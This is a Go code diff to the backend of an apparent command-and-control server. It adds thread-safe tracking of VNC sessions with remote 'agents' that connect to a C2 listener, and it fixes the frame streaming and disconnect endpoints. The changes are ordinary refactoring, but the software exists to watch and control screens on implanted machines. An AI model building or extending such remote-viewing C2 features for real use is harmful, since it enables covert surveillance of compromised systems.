@@ -10,6 +10,8 @@ import (
 	"os"
 	"os/signal"
 	"runtime/debug"
+	"strings"
+	"sync"
 	"syscall"
 	"time"
 
@@ -67,8 +69,34 @@ type VNCConnection struct {
 	ConnectedAt  time.Time `json:"connected_at"`
 }
 
-// Global VNC connections storage (in a real implementation, this would be part of your VNC service)
-var activeVNCConnections = make(map[string]*VNCConnection)
+// Global VNC connections storage with proper synchronization
+var (
+	activeVNCConnections = make(map[string]*VNCConnection)
+	vncMutex             sync.RWMutex
+)
+
+// Thread-safe VNC connection management
+func addVNCConnection(id string, conn *VNCConnection) {
+	vncMutex.Lock()
+	defer vncMutex.Unlock()
+	activeVNCConnections[id] = conn
+}
+
+func removeVNCConnection(id string) {
+	vncMutex.Lock()
+	defer vncMutex.Unlock()
+	delete(activeVNCConnections, id)
+}
+
+func getVNCConnections() []VNCConnection {
+	vncMutex.RLock()
+	defer vncMutex.RUnlock()
+	connections := make([]VNCConnection, 0, len(activeVNCConnections))
+	for _, conn := range activeVNCConnections {
+		connections = append(connections, *conn)
+	}
+	return connections
+}
 
 // loadConfig loads configuration from config.json
 func loadConfig() (*Config, error) {
@@ -144,7 +172,7 @@ func main() {
 	}
 	log.Println("Successfully connected to database")
 
-	// Initialize listener service
+	// Initialize listener service - MOVED BEFORE HANDLERS
 	listenerService := services.NewListenerService()
 	defer listenerService.Close()
 
@@ -338,10 +366,8 @@ func main() {
 				})
 			}
 		} else {
-			// Fallback to global map (existing behavior)
-			for _, conn := range activeVNCConnections {
-				connections = append(connections, *conn)
-			}
+			// Fallback to thread-safe global map
+			connections = getVNCConnections()
 		}
 
 		log.Printf("Returning %d active VNC connections", len(connections))
@@ -377,7 +403,11 @@ func main() {
 
 			for {
 				select {
-				case frame := <-frameChannel:
+				case frame, ok := <-frameChannel:
+					if !ok {
+						log.Printf("VNC frame channel closed")
+						return
+					}
 					// Send actual VNC frame
 					frameData := map[string]interface{}{
 						"connection_id": frame.ConnectionID,
@@ -417,7 +447,7 @@ func main() {
 						"status":        "test_mode",
 					}
 
-					frameJSON, _ := json.Marshal(testFrame)
+					frameJSON, _ := json.Marshal(testFrame) // Fixed: use testFrame instead of frameData
 					fmt.Fprintf(w, "data: %s\n\n", frameJSON)
 					if flusher, ok := w.(http.Flusher); ok {
 						flusher.Flush()
@@ -451,52 +481,41 @@ func main() {
 			request.FPS = 30
 		}
 
-// VNC connections are initiated by agents connecting to the C2 listener
-// The VNC service handles incoming connections automatically
-if vncService := listenerService.GetVNCService(); vncService != nil {
-    // Get current active connections to see if the agent is already connected
-    activeConnections := vncService.GetActiveConnections()
-    
-    // Check if we already have a connection from this agent
-    var existingConnectionID string
-    for _, conn := range activeConnections {
-        if agentIP, ok := conn["agent_ip"].(string); ok && strings.Contains(agentIP, request.AgentID) {
-            existingConnectionID = conn["id"].(string)
-            break
-        }
-    }
-    
-    if existingConnectionID != "" {
-        // Return existing connection info
-        w.Header().Set("Content-Type", "application/json")
-        json.NewEncoder(w).Encode(map[string]interface{}{
-            "success":       true,
-            "message":       "VNC connection already active",
-            "connection_id": existingConnectionID,
-        })
-    } else {
-        // No active connection - agent needs to connect
-        w.Header().Set("Content-Type", "application/json")
-        json.NewEncoder(w).Encode(map[string]interface{}{
-            "success": false,
-            "message": "No active VNC connection. Agent must connect to the C2 listener first.",
-        })
-    }
-    return
-}
+		// VNC connections are initiated by agents connecting to the C2 listener
+		// The VNC service handles incoming connections automatically
+		if vncService := listenerService.GetVNCService(); vncService != nil {
+			// Get current active connections to see if the agent is already connected
+			activeConnections := vncService.GetActiveConnections()
 
-			w.Header().Set("Content-Type", "application/json")
-			json.NewEncoder(w).Encode(map[string]interface{}{
-				"status":        "connected",
-				"connection_id": connectionID,
-				"agent_id":      request.AgentID,
-				"resolution":    request.Resolution,
-				"fps":           request.FPS,
-			})
+			// Check if we already have a connection from this agent
+			var existingConnectionID string
+			for _, conn := range activeConnections {
+				if agentIP, ok := conn["agent_ip"].(string); ok && strings.Contains(agentIP, request.AgentID) {
+					existingConnectionID = conn["id"].(string)
+					break
+				}
+			}
+
+			if existingConnectionID != "" {
+				// Return existing connection info
+				w.Header().Set("Content-Type", "application/json")
+				json.NewEncoder(w).Encode(map[string]interface{}{
+					"success":       true,
+					"message":       "VNC connection already active",
+					"connection_id": existingConnectionID,
+				})
+			} else {
+				// No active connection - agent needs to connect
+				w.Header().Set("Content-Type", "application/json")
+				json.NewEncoder(w).Encode(map[string]interface{}{
+					"success": false,
+					"message": "No active VNC connection. Agent must connect to the C2 listener first.",
+				})
+			}
 		} else {
 			// Fallback: Create mock connection
 			connectionID := fmt.Sprintf("vnc_%s_%d", request.AgentID, time.Now().Unix())
-			activeVNCConnections[connectionID] = &VNCConnection{
+			mockConnection := &VNCConnection{
 				ConnectionID: connectionID,
 				Hostname:     fmt.Sprintf("agent-%s", request.AgentID),
 				AgentIP:      "127.0.0.1",
@@ -504,6 +523,8 @@ if vncService := listenerService.GetVNCService(); vncService != nil {
 				FPS:          request.FPS,
 				ConnectedAt:  time.Now(),
 			}
+
+			addVNCConnection(connectionID, mockConnection)
 
 			w.Header().Set("Content-Type", "application/json")
 			json.NewEncoder(w).Encode(map[string]interface{}{
@@ -514,19 +535,26 @@ if vncService := listenerService.GetVNCService(); vncService != nil {
 		}
 	}))).Methods("POST")
 
+	// VNC disconnect endpoint - FIXED
 	api.Handle("/vnc/disconnect/{connection_id}", utils.AuthMiddleware(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
 		vars := mux.Vars(r)
 		connectionID := vars["connection_id"]
 
+		if connectionID == "" {
+			http.Error(w, "Connection ID is required", http.StatusBadRequest)
+			return
+		}
+
 		// Try to disconnect through VNC service
 		if vncService := listenerService.GetVNCService(); vncService != nil {
-			if err := vncService.DisconnectConnection(connectionID); err != nil {
+			if err := vncService.CloseConnection(connectionID); err != nil {
 				http.Error(w, fmt.Sprintf("Failed to disconnect VNC: %v", err), http.StatusInternalServerError)
 				return
 			}
+			log.Printf("VNC connection %s disconnected successfully", connectionID)
 		} else {
-			// Fallback: Remove from global map
-			delete(activeVNCConnections, connectionID)
+			// Fallback: Remove from thread-safe global map
+			removeVNCConnection(connectionID)
 		}
 
 		w.Header().Set("Content-Type", "application/json")
